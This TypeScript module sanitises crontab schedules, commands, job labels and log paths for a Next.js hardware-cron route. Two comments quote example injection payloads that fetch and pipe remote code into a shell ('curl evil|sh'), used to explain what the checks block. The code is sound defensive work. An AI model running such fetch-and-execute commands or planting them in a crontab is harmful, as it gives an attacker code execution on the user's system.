// ═══════════════════════════════════════════════════════════════
// hardware-cron-handlers/crontab-command.ts - the injection boundary
// ═══════════════════════════════════════════════════════════════
//
// Extracted from the /api/cron/hardware route god-file. Everything here
// turns caller-supplied text into something safe to write into a crontab
// line: the schedule fields, the command, the job label and the log
// target. This is the security-critical half of the route, so it lives in
// one module where it can be read and tested as a unit.
//
// See docs/contributing/repo-guide.md for why `canonicaliseScriptsCommand` rebuilds the
// command instead of validating it.

import { NextResponse } from "next/server";

import { badRequest } from "@/lib/api-response";
import { expandHomeInString, normalizeHardwareCronPath } from "@/lib/hardware-cron";
import { getPsScriptsDir, getPsHardwareLogDir } from "@/lib/paths";
import { interpreterFor } from "@/lib/platform";
import { SCRIPT_COMMAND_RE, SCRIPT_EXT_LIST } from "@/lib/scripts/script-ext";
import { resolveScriptPath } from "@/lib/scripts-manager";

/**
 * A job label becomes a `# <name>` comment line in the crontab, so a newline in
 * it writes an arbitrary extra crontab line. Collapse all whitespace.
 */
export function sanitiseCronName(name: string | undefined): string | undefined {
  if (!name) return undefined;
  const flat = name.replace(/\s+/g, " ").trim().slice(0, 120);
  return flat || undefined;
}

/** POSIX single-quote a path so spaces and metacharacters cannot break out. */
function shellQuote(value: string): string {
  return `'${value.replace(/'/g, `'\\''`)}'`;
}

/**
 * Every crontab field must be cron syntax and nothing else. Without this a
 * "5 fields" check passes `* * * * *;curl evil|sh` — the count is right and the
 * payload rides along into the user's crontab.
 */
const CRON_FIELD_RE = /^[0-9*,\-/]+$/;

export function rejectIfBadSchedule(schedule: string): NextResponse | null {
  const fields = schedule.trim().split(/\s+/);
  if (fields.length !== 5) {
    return badRequest("Schedule must have exactly 5 fields: min hour dom mon dow");
  }
  if (!fields.every((f) => CRON_FIELD_RE.test(f))) {
    return badRequest("Schedule fields may contain only digits, * , - and /");
  }
  return null;
}

/**
 * Rebuild the command PatterStage will install, from scratch.
 *
 * The previous check was `line.includes(scriptsDir + "/")` — a substring test,
 * so `curl evil.sh | sh  # /home/me/patterstage/data/scripts/` passed it and
 * became a crontab line. Validating attacker-controlled text is the wrong
 * shape of solution: instead we take ONLY the script's basename out of the
 * caller's input, resolve it under the scripts dir (which rejects traversal and
 * non-existent files), and regenerate the command from the interpreter map.
 * Anything else the caller supplied is discarded rather than approved.
 */
export function canonicaliseScriptsCommand(
  input: string,
): { ok: true; command: string; scriptName: string } | { ok: false; response: NextResponse } {
  const scriptsDir = getPsScriptsDir();
  const bad = (msg: string) => ({ ok: false as const, response: badRequest(msg) });

  // A path token ending in a script extension, or a bare basename. This used
  // to name four of the seven extensions, so a .ps1, .bat or .cmd fell through
  // to the refusal below and its Schedule button could never succeed (D47) —
  // the page listed those scripts and offered to schedule them, and this line
  // was the only thing saying no. It reads the shared rule now.
  const match = input.match(SCRIPT_COMMAND_RE);
  const scriptName = match?.[2];
  if (!scriptName) {
    return bad(`Command must name a script (${SCRIPT_EXT_LIST}) from the PatterStage scripts directory.`);
  }

  // If the caller named a DIRECTORY, it must be the scripts dir. Rebuilding
  // `~/.hermes/scripts/x.mjs` into `<scriptsDir>/x.mjs` would be safe but would
  // silently run a different file than the operator asked for.
  const dirPart = match?.[1];
  if (dirPart) {
    const given = normalizeHardwareCronPath(expandHomeInString(dirPart));
    if (given !== normalizeHardwareCronPath(scriptsDir)) {
      return bad(`Scripts must live in ${scriptsDir}; '${dirPart}' is outside it.`);
    }
  }

  const abs = resolveScriptPath(scriptName);
  if (!abs) {
    return bad(`'${scriptName}' is not an existing script in the PatterStage hardware scripts directory.`);
  }

  const interpreter = interpreterFor(abs);
  if (!interpreter) return bad(`No interpreter is available for '${scriptName}' on this platform.`);

  void scriptsDir; // resolveScriptPath already anchors to it; kept for clarity of intent
  const command = [interpreter.cmd, ...interpreter.args].map(shellQuote).join(" ");
  return { ok: true, command, scriptName };
}

/**
 * Constrain the log target to a plain filename inside the hardware log dir.
 * `logFile` is interpolated into the crontab line as `>> <logFile> 2>&1`, so an
 * unconstrained value is the same injection hole as the command was.
 */
export function resolveCronLogFile(requested: string | undefined, entryId: string): string | null {
  const logDir = getPsHardwareLogDir();
  if (!requested) return `${logDir}/${entryId}.log`;
  const base = requested.split(/[/\\]/).pop() ?? "";
  if (!base || !/^[A-Za-z0-9._-]+\.log$/.test(base)) return null;
  return `${logDir}/${base}`;
}
